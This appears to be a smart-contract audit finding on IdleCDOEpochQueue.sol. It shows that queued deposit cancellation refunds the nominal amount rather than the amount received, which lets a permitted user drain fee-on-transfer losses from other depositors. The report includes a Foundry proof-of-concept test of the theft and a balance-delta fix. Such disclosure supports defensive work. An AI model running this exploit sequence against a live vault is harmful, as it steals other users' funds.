### Title
Queued deposit cancellation refunds the nominal amount instead of the amount received - (File: contracts/IdleCDOEpochQueue.sol)

### Summary

`requestDeposit` records the caller-supplied `amount`, while `deleteRequest` later refunds that same nominal amount rather than the actual increase in the queue’s underlying balance. For a fee-on-transfer underlying, this breaks the deposit/cancellation invariant and lets a KYC-passing attacker withdraw more than was deposited. [1](#0-0) [2](#0-1) 

### Finding Description

`IdleCDOEpochQueue.requestDeposit` executes `safeTransferFrom(msg.sender, address(this), amount)` and unconditionally credits both `userDepositsEpochs` and `epochPendingDeposits` with the supplied `amount`. [3](#0-2) 

A fee-on-transfer ERC20 can return successfully while delivering less than `amount`. The queue never compares `balanceOf(address(this))` before and after the transfer, so the accounting balance exceeds the real received balance by the transfer fee. `deleteRequest` then clears the recorded amount and sends that full amount back to the caller while the request remains queue-held. [2](#0-1) 

The same nominal-amount pattern also exists in the CDO’s mid-epoch deposit path, which transfers `_amount` and records `_amount` without measuring the received amount. [4](#0-3) 

### Impact Explanation

An attacker with a permitted wallet can steal other queued users’ underlying or an accidental queue balance equal to the transfer fee. For example, with a 1% fee-on-transfer underlying and 100 tokens already held by the queue, the attacker requests 100 tokens, the queue receives 99 tokens, and cancellation pays the attacker 100 tokens, yielding 1 token of direct profit. This violates the fair deposit and one-receipt-one-payout invariant because the request is backed by only the received amount but settles at the nominal amount. [5](#0-4) [6](#0-5) 

The theft is capped by the queue’s spendable balance rather than by the attacker’s deposit. The attacker can repeat the sequence while the epoch remains running and the queue has sufficient underlying balance. [2](#0-1) [7](#0-6) 

### Likelihood Explanation

The attack requires a deployed credit vault whose underlying token charges a transfer fee or otherwise delivers fewer tokens than the `transferFrom` argument. No privileged caller is required after the epoch is running: `requestDeposit` only checks that the epoch is active and that the caller passes the vault’s wallet allowlist. [8](#0-7) [7](#0-6) 

The existing guards do not prevent it. `nonReentrant` does not detect the accounting mismatch, `_skimDonatedAssets` runs in the CDO rather than before queue crediting, and `deleteRequest` intentionally remains available before pricing or prefunding. [9](#0-8) [2](#0-1) [10](#0-9) 

### Recommendation

Record the actual received amount with balance deltas:

```solidity
uint256 balanceBefore = IERC20Detailed(underlying).balanceOf(address(this));
IERC20Detailed(underlying).safeTransferFrom(msg.sender, address(this), amount);
uint256 received = IERC20Detailed(underlying).balanceOf(address(this)) - balanceBefore;
userDepositsEpochs[msg.sender][nextEpoch] += received;
epochPendingDeposits[nextEpoch] += received;
```

Apply the same received-amount accounting to `depositDuringEpoch` and explicitly reject fee-on-transfer, rebasing, or otherwise non-1:1 ERC20 underlyings if they are unsupported.

### Proof of Concept

```solidity
function testQueueDeleteRefundsMoreThanReceived() public {
  // Assumes vault underlying is a token charging 1% on transfers.
  // Victim already has a 100-token queue-held deposit.
  address victim = makeAddr("victim");
  address attacker = makeAddr("attacker");
  uint256 requestEpoch = strategy.epochNumber() + 1;

  uint256 victimAmount = 100e6;
  uint256 attackerAmount = 100e6;

  _requestDepositWithUser(victim, victimAmount);

  deal(address(underlying), attacker, attackerAmount);
  vm.startPrank(attacker);
  underlying.approve(address(queue), attackerAmount);

  uint256 attackerBefore = underlying.balanceOf(attacker);
  queue.requestDeposit(attackerAmount);

  // Queue received only 99e6 but credited 100e6.
  assertEq(underlying.balanceOf(address(queue)), 198e6);
  assertEq(queue.epochPendingDeposits(requestEpoch), 200e6);

  queue.deleteRequest(requestEpoch);
  vm.stopPrank();

  // The attacker supplied 100e6, 1e6 was burned as transfer fee,
  // and received 100e6 back. The queue absorbed the missing token.
  assertEq(underlying.balanceOf(attacker) - attackerBefore, 1e6);
  assertEq(underlying.balanceOf(address(queue)), 98e6);
  assertEq(queue.epochPendingDeposits(requestEpoch), victimAmount);
}
```

### Citations

**File:** contracts/IdleCDOEpochQueue.sol (L103-126)
```text
  function requestDeposit(uint256 amount) external nonReentrant {
    // check if the wallet is allowed to deposit (ie epoch is running and keyring KYC completed)
    _checkAllowed(msg.sender);

    IdleCDOEpochVariant _cdo = IdleCDOEpochVariant(idleCDOEpoch);
    uint256 nextEpoch = IdleCreditVault(strategy).epochNumber() + 1;
    uint256 _prefundedWindow = prefundedDepositWindow;
    // Only the AA prefunded queue enforces a deposit cutoff for the next epoch.
    if (tranche == _cdo.AATranche() && _isPrefundedQueueEnabled()) {
      IdleCDOEpochVariantPrefunded(idleCDOEpoch).checkPrefunding(epochPendingDeposits[nextEpoch] + amount);
      // Once funds are prefunded, or once the subscription window is reached, the next epoch is closed.
      _checkNotAllowed(
        epochPrefundedDeposits[nextEpoch] != 0 || (
        _prefundedWindow != 0 && block.timestamp + _prefundedWindow >= _cdo.epochEndDate()
      ));
    }

    // get underlying tokens from user
    IERC20Detailed(underlying).safeTransferFrom(msg.sender, address(this), amount);
    // deposit will be made in the next buffer period (ie next epoch)
    // updated user queued amount for the next epoch
    userDepositsEpochs[msg.sender][nextEpoch] += amount;
    // update pending deposits
    epochPendingDeposits[nextEpoch] += amount;
```

**File:** contracts/IdleCDOEpochQueue.sol (L184-198)
```text
  function deleteRequest(uint256 _requestEpoch) external {
    // if the epoch price is already set, deposits were already processed so
    // the deposit request can't be deleted.
    _checkNotAllowed(epochPrice[_requestEpoch] != 0 || epochPrefundedDeposits[_requestEpoch] != 0);

    uint256 amount = userDepositsEpochs[msg.sender][_requestEpoch];
    if (amount == 0) {
      return;
    }
    // reset user deposit for the epoch
    userDepositsEpochs[msg.sender][_requestEpoch] = 0;
    // update pending deposits
    epochPendingDeposits[_requestEpoch] -= amount;
    // transfer underlyings back to the user
    IERC20Detailed(underlying).safeTransfer(msg.sender, amount);
```

**File:** contracts/IdleCDOEpochQueue.sol (L415-420)
```text
  function _checkAllowed(address wallet) internal view {
    IdleCDOEpochVariant cdoEpoch = IdleCDOEpochVariant(idleCDOEpoch);
    if (!cdoEpoch.isEpochRunning()) {
      revert EpochNotRunning();
    }
    _checkNotAllowed(!cdoEpoch.isWalletAllowed(wallet));
```

**File:** contracts/IdleCDOEpochVariant.sol (L643-649)
```text
  /// @notice Deposit funds in the vault. Overrides the parent method and adds a check for wallet 
  function _deposit(uint256 _amount, address _tranche) internal override whenNotPaused returns (uint256) {
    _checkNotAllowed(!isWalletAllowed(msg.sender));
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();
    // do the inherited deposit flow
    return super._deposit(_amount, _tranche);
```

**File:** contracts/IdleCDOEpochVariant.sol (L679-685)
```text
    _skimDonatedAssets();
    // Check that limit is not exceeded after removing skimmable raw donations.
    _guarded(_amount);
    _updateAccounting();

    // Get underlyings from user
    _transferUnderlyingsFrom(msg.sender, address(this), _amount);
```
